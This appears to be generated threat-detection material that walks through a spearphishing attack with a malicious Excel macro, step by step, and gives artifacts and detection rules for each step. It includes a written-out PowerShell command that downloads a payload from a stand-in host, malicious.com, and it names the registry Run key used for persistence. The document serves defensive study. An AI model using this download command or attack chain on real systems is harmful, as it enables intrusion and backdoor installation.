<output>
1. **Pattern Name**: Spearphishing with Malicious Excel Macro
   - **Scenario Overview**: An attacker sends a spearphishing email containing a malicious Excel document. The document exploits social engineering to convince the user to enable macros, which then execute a payload that establishes a backdoor on the system.

   <output>
   1. **Email Delivery**
      - Application: Outlook
      - User Action: User receives an email from a spoofed address (e.g., finance@company.com).
      - Key Artifacts: Email headers indicating spoofing, attachment named "Financial_Report.xlsx".
      - Detection: Monitor for emails with suspicious "From" addresses and attachments with common spearphishing file types.
   </output>

   <output>
   2. **User Interaction**
      - Application: Outlook
      - User Action: User opens the email and clicks on the attachment.
      - Key Artifacts: User clicks on "Enable Content" to allow macros.
      - Detection: Monitor for user interactions with attachments and enabling macros.
   </output>

   <output>
   3. **Execution of Malicious Macro**
      - Application: Microsoft Excel
      - User Action: The macro executes upon enabling content.
      - Key Artifacts: Macro code that executes a PowerShell command to download a payload.
      - Detection: Monitor for processes spawned from Excel that execute scripts or download files.
   </output>

   <output>
   4. **Payload Download**
      - Application: PowerShell
      - User Action: The macro triggers a PowerShell command to download a malicious executable.
      - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\Users\User\Downloads\payload.exe`
      - Detection: Monitor for PowerShell commands that download executables from suspicious URLs.
   </output>

   <output>
   5. **Execution of Malicious Payload**
      - Application: Windows Explorer
      - User Action: User inadvertently runs the downloaded executable.
      - Key Artifacts: Executable file located at `C:\Users\User\Downloads\payload.exe`.
      - Detection: Monitor for execution of newly created executables in user download directories.
   </output>

   <output>
   6. **Establishing Persistence**
      - Application: Windows Registry
      - User Action: The payload modifies the registry to ensure persistence.
      - Key Artifacts: Registry key modification at `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`.
      - Detection: Monitor for changes to registry keys associated with startup programs.
   </output>
</output>